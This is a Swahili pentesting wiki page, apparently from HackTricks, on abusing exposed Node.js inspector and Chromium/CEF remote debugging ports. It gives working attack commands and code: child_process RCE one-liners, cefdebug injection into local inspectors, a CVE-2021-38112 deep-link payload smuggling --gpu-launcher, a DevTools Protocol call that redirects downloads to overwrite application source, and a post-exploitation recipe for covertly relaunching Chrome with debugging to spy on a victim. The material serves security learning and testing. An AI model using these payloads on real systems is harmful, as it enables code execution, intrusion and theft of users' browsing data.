# Unyanyasaji wa Node inspector/CEF debug

Mifano ya kihistoria ya vitendo inajumuisha walkthrough ya Multimaster na shambulio la debugger la Visual Studio Code la CVE-2019-1414; itumie kama muktadha unaohusiana na version badala ya kudhani kwamba kila target ya sasa ya Electron au Chromium inafichua primitives zilezile.<sup>[[1]](#references)[[3]](#references)</sup>

## Taarifa za Msingi

[Kutoka kwenye docs](https://nodejs.org/learn/getting-started/debugging): Inapoanzishwa kwa switch ya `--inspect`, process ya Node.js husikiliza client ya debugging. Kwa **default**, itasikiliza kwenye host na port **`127.0.0.1:9229`**. Kila process pia hupewa **UUID** **ya kipekee**.<sup>[[4]](#references)</sup>

Clients za Inspector lazima zijue na zibainishe anwani ya host, port, na UUID ili kuunganishwa. URL kamili itaonekana kama `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Kwa kuwa **debugger ina access kamili kwenye execution environment ya Node.js**, actor hasidi anayeweza kuunganishwa kwenye port hii anaweza kuweza kutekeleza code ya kiholela kwa niaba ya process ya Node.js (**uwezekano wa privilege escalation**).<sup>[[4]](#references)</sup>

Kuna njia kadhaa za kuanzisha Inspector:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Unapoanzisha mchakato unaochunguzwa, kitu kama hiki kitaonekana:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Michakato inayotegemea **CEF** (**Chromium Embedded Framework**) inaweza kufichua debugger kwa kutumia `--remote-debugging-port=9222`. Hii hufichua browser kupitia [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) badala ya Node.js inspector, kwa hivyo payload za Node.js zinazotegemea `process` hazitumiki moja kwa moja kwa chaguomsingi.<sup>[[2]](#references)[[5]](#references)</sup>

Unapoanzisha browser iliyo katika hali ya debug, kitu kama hiki kitaonekana:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets na same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Tovuti zinazofunguliwa kwenye web-browser zinaweza kufanya maombi ya WebSocket na HTTP chini ya security model ya browser. **Muunganisho wa awali wa HTTP** ni muhimu ili **kupata kitambulisho cha kipekee cha session ya debugger**. **Same-origin-policy** **huzuia** tovuti kuweza kufanya **muunganisho huu wa HTTP**. Kwa usalama wa ziada dhidi ya [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js huthibitisha kwamba **'Host' headers** za muunganisho huo zinabainisha ama **IP address** au **`localhost`** kwa usahihi.<sup>[[4]](#references)</sup>

> [!TIP]
> **Hatua hii ya usalama huzuia ku-exploit inspector** ili kuendesha code kwa **kutuma tu HTTP request** (jambo ambalo lingewezekana kwa ku-exploit SSRF vuln).<sup>[[4]](#references)</sup>

### Kuanzisha inspector katika processes zinazoendelea

Unaweza kutuma **signal SIGUSR1** kwa process ya nodejs inayoendelea ili kuifanya **ianzishe inspector** kwenye port ya default. Hata hivyo, kumbuka kwamba unahitaji kuwa na privileges za kutosha; kwa hiyo, hii inaweza kukupa **ufikiaji wa privileged kwa taarifa zilizo ndani ya process**, lakini si privilege escalation ya moja kwa moja.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Hii ni muhimu katika containers kwa sababu **kuzima process na kuanzisha mpya** yenye `--inspect` **si chaguo** kwa sababu **container** ita**uawa** pamoja na process.<sup>[[6]](#references)</sup>

### Unganisha kwenye inspector/debugger

Ili kuunganisha kwenye **browser inayotegemea Chromium**, URL za `chrome://inspect` au `edge://inspect` zinaweza kufikiwa kwa Chrome au Edge, mtawalia. Kwa kubofya kitufe cha Configure, inapaswa kuhakikisha kuwa **target host na port** zimeorodheshwa kwa usahihi. Picha inaonyesha mfano wa Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Baada ya URL ya kufikia debugger kuonekana. k.m. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Unganisha kwenye inspector/debugger: Ili kuunganisha kwenye browser inayotegemea Chromium,...](<../../images/image (674).png>)

Kwa kutumia **command line** unaweza kuunganisha kwenye debugger/inspector kwa:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Zana [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), inaruhusu **kutafuta inspectors** zinazoendesha ndani ya mfumo wa ndani na **kuingiza code** ndani yao.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Kumbuka kwamba **NodeJS RCE exploits hazitafanya kazi** ikiwa umeunganishwa kwenye browser kupitia [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (unahitaji kukagua API ili kupata mambo ya kuvutia ya kufanya nayo).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE katika NodeJS Debugger/Inspector

> [!TIP]
> Ikiwa umefika hapa ukitafuta jinsi ya kupata [**RCE kutoka kwa XSS katika Electron, tafadhali angalia ukurasa huu.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Baadhi ya njia za kawaida za kupata **RCE** unapoweza **kuunganisha** kwenye Node **inspector** ni kutumia kitu kama hiki (inaonekana kwamba hii **haitafanya kazi katika connection ya Chrome DevTools protocol**):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Payloads za Chrome DevTools Protocol

Unaweza kuangalia API hapa: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Katika sehemu hii nitaorodhesha tu mambo ya kuvutia ambayo nimegundua kuwa watu wametumia ku-exploit protocol hii.

### Parameter Injection kupitia Deep Links

Katika [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), Rhino security iligundua kuwa application iliyotegemea CEF ilisajili **custom UR**I kwenye mfumo (workspaces://index.html), ambayo ilipokea URI kamili na kisha **ilianzisha applicatio**n iliyotegemea CEF ikiwa na configuration iliyoundwa kwa sehemu kutoka kwenye URI hiyo.<sup>[[8]](#references)</sup>

Iligunduliwa kuwa parameters za URI zilifanyiwa URL decoding na kutumiwa kuanzisha CEF basic application, hivyo kumruhusu mtumiaji **ku-inject** flag **`--gpu-launcher`** kwenye **command line** na kutekeleza vitu kiholela.<sup>[[8]](#references)</sup>

Kwa hiyo, payload kama hii:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Itatekeleza calc.exe.<sup>[[8]](#references)</sup>

### Kubatilisha Faili

Badilisha folda ambamo **faili zilizopakuliwa zitahifadhiwa** na pakua faili ili **kubatilisha** **source code** inayotumiwa mara kwa mara ya application kwa **code yako hasidi**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE and exfiltration

STAR Labs ilionyesha kuwa services za WebDriver/CDP zilizoachwa wazi zinaweza kuwezesha usomaji wa arbitrary files na RCE; DNS rebinding inaweza kukamilisha exploit chain katika baadhi ya configurations.<sup>[[9]](#references)</sup>

Kwa kesi za kihistoria za browser-automation na usalama wa Chromium, angalia write-up ya Counter WebDriver na issues 773, 1742, na 1944 za Project Zero.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Post-Exploitation

Katika mazingira halisi na **baada ya ku-compromise** PC ya user inayotumia browser inayotegemea Chrome/Chromium, unaweza kuanzisha Chrome process ikiwa na **debugging imewashwa na ku-port-forward debugging port** ili uweze kuifikia. Kwa njia hii utaweza **kukagua kila kitu victim anachofanya kwa Chrome na kuiba taarifa nyeti**.<sup>[[7]](#references)</sup>

Njia ya stealth ni **kufunga kila Chrome process** kisha kuita kitu kama:<sup>[[7]](#references)</sup>
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Zana ya ukaguzi na exploitation ya CEF/Chromium debugger](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Utekelezaji wa Msimbo kwa Mbali katika Visual Studio Code kupitia Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Mwongozo wa Node.js Debugging - Kuanza](https://nodejs.org/learn/getting-started/debugging)
- [5] [Itifaki ya Chrome DevTools](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Maelezo ya corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Kutumia Vibaya Kipengele cha Chrome cha Debugging ili Kuchunguza na Kudhibiti Vipindi vya Kuvinjari kwa Mbali](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Utekelezaji wa Msimbo kwa Mbali katika AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Unaongea Nami? - WebDriver RCE kupitia DNS Rebinding na CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Kukabiliana na WebDriver - Kutoka Bot hadi RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
{{#include ../../banners/hacktricks-training.md}}
